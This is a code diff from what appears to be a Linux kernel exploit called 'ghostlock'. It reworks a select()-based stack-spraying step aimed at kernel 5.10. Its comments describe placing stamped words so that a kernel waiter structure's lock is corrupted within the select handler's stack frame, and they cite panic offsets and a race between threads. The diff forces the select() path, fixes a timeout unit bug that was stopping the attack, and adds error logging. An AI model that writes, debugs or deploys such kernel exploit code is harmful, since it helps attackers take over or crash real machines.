@@ -458,7 +458,7 @@ namespace ghostlock::route::select_stack {
                     attempt, attempts, layout.compact_waiter.value_or(0),
                     route::fops_elapsed_ms(&route_t0));
             errno = 0;
-            if (layout.compact_waiter.value_or(0)) {
+            {
                 uint32_t timeout_us = profile.select_timeout_us();
                 /* 5.10 (compact_waiter=2): call select(), not pselect().
                  * The kernel-side select handler frame is 0x50 bytes
@@ -468,16 +468,11 @@ namespace ghostlock::route::select_stack {
                  * every stamped word inside the 15-word on-stack window.
                  * pselect's deeper frame pushed the waiter to global word
                  * 17 — unreachable with nfds=320 (panic +0x188,
-                 * waiter->lock = 0x800). */
-                struct timeval timeout = {
-                    .tv_sec = timeout_us / 1000000,
-                    .tv_usec = (long) (timeout_us % 1000000) * 1000,
-                };
-                select_result = select(
-                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
-                    exception_set.raw(), &timeout);
-            } else {
-                uint32_t timeout_us = profile.select_timeout_us();
+                 * waiter->lock = 0x800).
+                 * NOTE: select_timeout_us is microseconds; tv_usec must
+                 * stay < 1000000. The earlier `* 1000` here turned 200000
+                 * into tv_usec=2e8 and select() bailed out with EINVAL
+                 * at +0ms on the first 5.10 run that got past CMP. */
                 struct timeval timeout = {
                     .tv_sec = timeout_us / 1000000,
                     .tv_usec = timeout_us % 1000000,
@@ -488,9 +483,10 @@ namespace ghostlock::route::select_stack {
             }
             select_errno = errno;
             route::restore_standard_io(stdio_backup);
-            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
+            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d errno=%d (%s)\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
-                    route::fops_elapsed_ms(&route_t0), select_result);
+                    route::fops_elapsed_ms(&route_t0), select_result,
+                    select_errno, strerror(select_errno));
             race->consumer_go.store(0);
 
             const int32_t calls = race->consumer_calls.load();
